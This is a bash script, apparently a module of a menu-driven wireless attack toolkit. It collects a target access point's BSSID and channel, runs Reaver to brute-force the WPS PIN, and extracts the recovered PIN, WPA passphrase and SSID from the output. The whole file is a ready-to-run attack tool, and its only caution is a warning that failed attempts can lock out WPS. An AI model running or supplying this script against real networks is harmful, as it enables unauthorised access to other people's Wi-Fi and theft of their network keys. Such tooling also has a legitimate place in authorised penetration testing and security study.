#!/bin/bash

source Attacks/common.sh

# Color & style constants
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# Require root privileges
require_root

# Main menu prompt
prompt_to_continue() {
    local options=("Start Pin guess attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}               Pin guess attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} Too many wrong PIN attempts may lock out WPS permanently."
    echo -e "${RED}[!]${NC} Make sure you’ve enabled a monitor interface using ${BOLD}iw dev${NC}."


    echo
    echo -e "${GREEN}[*]${NC} Available options:"
    echo
    for i in "${!options[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} ${options[$i]}"
        sleep 0.1
    done
    echo -e "  ${GREEN}[0]${NC} Go back"
    echo

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Choose an option:") " opt
        case "$opt" in
            1) break ;;  
            0) go_back ;;  
            *) echo -e "${RED}[!]${NC} Invalid. Choose 0 or 1."; sleep 0.3 ;;
        esac
    done
}

run_pin_guess() {
    clear
    echo -e "${GREEN}[*]${NC} Enter details for the PIN-GUESS attack:"

    # Ask for target BSSID
    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} BSSID (XX:XX:XX:XX:XX:XX): ")" bssid
        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid MAC address."
            sleep 0.3
        fi
    done
    echo -e "${GREEN}[✓]${NC} BSSID set: $bssid"

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Target AP channel (1-14):" ) " channel
        if [[ "$channel" =~ ^[0-9]+$ ]] && (( channel>=1 && channel<=14 )); then
            break
        else
            echo -e "${RED}[!]${NC} Invalid. 1-14 only."; sleep 0.3
        fi
    done
    echo -e "${GREEN}[✓]${NC} Channel set: $channel"

    read -rp "$(echo -e "${GREEN}[*]${NC} Press Enter to start attack.") "

    echo -e "${GREEN}[*]${NC} Running Reaver (timeout 5 minutes)..."
    OUTPUT=$(timeout 300s sudo reaver -i "$MONITOR_INTERFACE" -c "$channel" -b "$bssid" -vvv)
    parse_results "$OUTPUT"
}

# Function: parse_results – extract PIN, PSK, and SSID from Reaver output
parse_results() {
    local output="$1"
    if echo "$output" | grep -q "WPS PIN:"; then
        local PIN=$(echo "$output" | awk '/WPS PIN:/ {print $NF}')
        local PSK=$(echo "$output" | awk '/WPA PSK:/ {print $NF}')
        local SSID=$(echo "$output" | awk -F'SSID: ' '/AP SSID:/ {print $2}')
        echo
        echo -e "${GREEN}[*]${NC} Results: "
        echo -e "  ${GREEN}[✓]${NC} PIN: $PIN"
        echo -e "  ${GREEN}[✓]${NC} PSK: $PSK"
        echo -e "  ${GREEN}[✓]${NC} AP SSID: $SSID"
        echo 
    else
        echo -e "${RED}[!]${NC} Failed to find the PIN using Reaver."
    fi
    
    echo -e "${GREEN}[✓]${NC} Attack complete."; sleep 0.5
}

# Repeat or go back (stop capture then menu)
after_attack_options() {
    echo
    echo -e "  ${GREEN}[1]${NC} New pin guess attack"
    echo -e "  ${GREEN}[0]${NC} Go back to main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Choose an option:") " o
        case "$o" in
            1) clear; run_pin_guess; after_attack_options; break ;;  
            0) ask_stop_capture; go_back ;;
            *) echo -e "${RED}[!]${NC} Type 0 or 1."; sleep 0.3
        esac
    done
}

# Entry point
main() {
    clear
    prompt_to_continue
    check_monitor_interfaces
    ask_capture_choice wps
    run_pin_guess
    after_attack_options
}

main
